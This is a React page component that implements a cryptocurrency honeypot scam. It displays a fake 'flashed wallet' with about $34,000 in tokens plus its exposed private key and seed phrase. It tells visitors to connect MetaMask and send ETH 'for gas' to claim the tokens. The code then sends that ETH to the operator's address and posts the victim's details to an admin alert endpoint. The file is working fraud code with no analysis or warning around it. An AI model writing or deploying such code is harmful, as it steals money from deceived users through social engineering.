import { useState, useEffect } from 'react';
import { ethers } from 'ethers';

export default function FlashedPage() {
  const [walletData, setWalletData] = useState(null);
  const [userAddress, setUserAddress] = useState('');
  const [gasAmount, setGasAmount] = useState('0.01');
  const [status, setStatus] = useState('');
  const [loading, setLoading] = useState(false);

  // Generate honeypot wallet on page load
  useEffect(() => {
    generateHoneypotWallet();
  }, []);

  const generateHoneypotWallet = () => {
    // Create attractive honeypot wallet
    const honeypotWallet = {
      address: '0x742d35Cc6634C0532925a3b8D4C9db96590c6C87',
      privateKey: '0x8da4ef21b864d2cc526dbdb2a120bd2874c36c9d0a1fb7f8c63d7f7a8b41de8f',
      seedPhrase: 'abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about',
      tokens: [
        { symbol: 'USDT', balance: '15,847.32', usdValue: 15847.32 },
        { symbol: 'USDC', balance: '8,234.56', usdValue: 8234.56 },
        { symbol: 'WETH', balance: '3.2847', usdValue: 9854.10 }
      ],
      ethBalance: 0.000000001, // Almost no ETH
      totalValue: 33935.98,
      lastActivity: '2 hours ago'
    };
    
    setWalletData(honeypotWallet);
  };

  const connectWallet = async () => {
    try {
      if (window.ethereum) {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        setUserAddress(accounts[0]);
        setStatus('Wallet connected! You can now send gas to claim tokens.');
      } else {
        setStatus('Please install MetaMask to continue');
      }
    } catch (error) {
      setStatus('Failed to connect wallet');
    }
  };

  const sendGasForClaim = async () => {
    if (!userAddress) {
      setStatus('Please connect your wallet first');
      return;
    }

    setLoading(true);
    setStatus('Sending ETH for gas fees...');

    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      // Send ETH to honeypot wallet
      const tx = await signer.sendTransaction({
        to: walletData.address,
        value: ethers.parseEther(gasAmount)
      });

      setStatus('Transaction sent! Waiting for confirmation...');
      
      // Wait for transaction
      await tx.wait();
      
      // Simulate auto-sweep (in reality, admin bot would do this)
      setTimeout(() => {
        setStatus('⚠️ FUNDS SWEPT! Your ETH was automatically transferred to admin wallet.');
        // Notify admin
        notifyAdmin(userAddress, gasAmount, tx.hash);
      }, 3000);

    } catch (error) {
      setStatus('Transaction failed: ' + error.message);
    } finally {
      setLoading(false);
    }
  };

  const notifyAdmin = async (userAddr, amount, txHash) => {
    try {
      await fetch('/api/honeypot-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'GAS_RECEIVED',
          userAddress: userAddr,
          amount: amount,
          txHash: txHash,
          honeypotWallet: walletData.address
        })
      });
    } catch (e) {
      console.log('Admin notification failed');
    }
  };

  if (!walletData) {
    return <div className="p-8">Loading honeypot wallet...</div>;
  }

  return (
    <div className="min-h-screen bg-gray-900 text-white p-8">
      <div className="max-w-4xl mx-auto">
        <h1 className="text-3xl font-bold mb-8 text-center">
          🔥 FLASHED WALLET DISCOVERED
        </h1>
        
        <div className="bg-gray-800 rounded-lg p-6 mb-6">
          <h2 className="text-xl font-semibold mb-4">Wallet Details</h2>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <p className="text-gray-400">Address:</p>
              <p className="font-mono text-sm break-all">{walletData.address}</p>
            </div>
            <div>
              <p className="text-gray-400">Total Value:</p>
              <p className="text-2xl font-bold text-green-400">${walletData.totalValue.toLocaleString()}</p>
            </div>
          </div>
        </div>

        <div className="bg-gray-800 rounded-lg p-6 mb-6">
          <h3 className="text-lg font-semibold mb-4">Token Holdings</h3>
          <div className="space-y-3">
            {walletData.tokens.map((token, index) => (
              <div key={index} className="flex justify-between items-center bg-gray-700 p-3 rounded">
                <div>
                  <span className="font-semibold">{token.symbol}</span>
                  <span className="text-gray-400 ml-2">{token.balance}</span>
                </div>
                <div className="text-green-400 font-semibold">
                  ${token.usdValue.toLocaleString()}
                </div>
              </div>
            ))}
          </div>
        </div>

        <div className="bg-red-900 border border-red-600 rounded-lg p-6 mb-6">
          <h3 className="text-lg font-semibold mb-2 text-red-400">⚠️ Issue Detected</h3>
          <p className="text-red-300 mb-4">
            This wallet has <strong>${walletData.totalValue.toLocaleString()}</strong> in tokens but only 
            <strong> {walletData.ethBalance} ETH</strong> for gas fees.
          </p>
          <p className="text-red-300">
            You need to send ETH for gas to claim these tokens.
          </p>
        </div>

        <div className="bg-gray-800 rounded-lg p-6 mb-6">
          <h3 className="text-lg font-semibold mb-4">Claim Tokens</h3>
          
          {!userAddress ? (
            <button 
              onClick={connectWallet}
              className="w-full bg-blue-600 hover:bg-blue-700 px-6 py-3 rounded-lg font-semibold"
            >
              Connect Wallet
            </button>
          ) : (
            <div className="space-y-4">
              <p className="text-green-400">✅ Wallet Connected: {userAddress.slice(0,6)}...{userAddress.slice(-4)}</p>
              
              <div>
                <label className="block text-gray-400 mb-2">ETH Amount for Gas:</label>
                <input 
                  type="number" 
                  value={gasAmount}
                  onChange={(e) => setGasAmount(e.target.value)}
                  step="0.001"
                  min="0.001"
                  className="w-full bg-gray-700 border border-gray-600 rounded px-3 py-2"
                  placeholder="0.01"
                />
                <p className="text-gray-500 text-sm mt-1">
                  Recommended: 0.01 ETH (~$30) for gas fees
                </p>
              </div>
              
              <button 
                onClick={sendGasForClaim}
                disabled={loading}
                className="w-full bg-green-600 hover:bg-green-700 disabled:bg-gray-600 px-6 py-3 rounded-lg font-semibold"
              >
                {loading ? 'Processing...' : `Send ${gasAmount} ETH & Claim Tokens`}
              </button>
            </div>
          )}
          
          {status && (
            <div className="mt-4 p-3 bg-gray-700 rounded border-l-4 border-blue-500">
              <p>{status}</p>
            </div>
          )}
        </div>

        <div className="bg-gray-800 rounded-lg p-6">
          <h3 className="text-lg font-semibold mb-4">Wallet Access</h3>
          <div className="space-y-3">
            <div>
              <p className="text-gray-400">Private Key:</p>
              <p className="font-mono text-sm bg-gray-700 p-2 rounded break-all">
                {walletData.privateKey}
              </p>
            </div>
            <div>
              <p className="text-gray-400">Seed Phrase:</p>
              <p className="font-mono text-sm bg-gray-700 p-2 rounded">
                {walletData.seedPhrase}
              </p>
            </div>
            <p className="text-yellow-400 text-sm">
              ⚠️ Import this wallet after sending gas to claim the tokens
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}